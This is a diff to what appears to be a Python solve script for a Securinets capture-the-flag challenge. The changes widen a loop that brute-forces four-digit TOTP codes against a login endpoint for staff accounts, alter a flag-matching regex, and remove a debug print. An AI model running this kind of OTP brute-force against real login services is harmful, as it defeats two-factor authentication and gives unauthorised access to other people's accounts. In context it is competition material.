@@ -5,7 +5,6 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 
 BASE_URL = "http://51.77.140.155:9100"
 REGISTER_URL = f"{BASE_URL}/register"
-print(REGISTER_URL)
 LOGIN_URL = f"{BASE_URL}/login"
 STATUS_URL = f"{BASE_URL}/status"
 DASHBOARD_URL = f"{BASE_URL}/dashboard"
@@ -91,7 +90,7 @@ def get_flag(token):
 	logging.info("Getting the flag.")
 	response = requests.get(DASHBOARD_URL, cookies={"access_token_cookie": token})
 	if response.status_code == 200:
-		flag = re.search(r"flag{.*}", response.text).group()
+		flag = re.search(r"Securinets{.*}", response.text).group()
 		logging.info(f"Flag: {flag}")
 		return flag
 	logging.error("Failed to get the flag.")
@@ -127,7 +126,7 @@ if __name__ == "__main__":
 		exit(1)
   
 	for s in staff:
-		for i in range(1336, 10000):
+		for i in range(1000, 10000):
 			totp_code = str(i)
 			rep = login_user(s["username"], strongpassword, totp_code)
 			if rep:
